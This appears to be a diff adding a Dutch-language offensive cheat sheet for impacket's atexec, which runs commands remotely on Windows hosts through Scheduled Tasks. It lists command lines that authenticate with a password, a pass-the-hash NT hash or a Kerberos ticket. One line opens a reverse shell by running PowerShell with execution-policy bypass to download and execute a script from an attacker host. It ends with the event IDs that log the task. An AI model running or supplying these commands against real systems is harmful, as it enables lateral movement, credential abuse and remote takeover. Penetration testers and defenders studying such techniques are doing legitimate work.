@@ -1,0 +1,25 @@
+# AtExec — Remote command execution via Scheduled Tasks
+# Gebruikt de Task Scheduler service voor remote code execution
+#
+# === Vereisten ===
+# - Local admin op doelwit
+# - Task Scheduler service actief
+#
+# === Voorbeelden ===
+
+# impacket atexec
+python3 atexec.py DOMAIN/USER:'PASS'@TARGET_IP 'whoami /all'
+
+# Met NTLM hash
+python3 atexec.py DOMAIN/USER@TARGET_IP -hashes :NT_HASH 'whoami'
+
+# Met Kerberos
+export KRB5CCNAME=admin.ccache
+python3 atexec.py -k -no-pass DOMAIN/USER@TARGET_FQDN 'whoami'
+
+# Reverse shell via atexec
+python3 atexec.py DOMAIN/USER:'PASS'@TARGET_IP 'powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString(\"http://ATTACKER_IP/shell.ps1\")'
+
+# Noot: Maakt een scheduled task aan die direct uitgevoerd wordt
+# Noot: Task wordt na uitvoering automatisch verwijderd
+# Noot: Event ID 4698 (task created) en 4699 (task deleted) in Security log
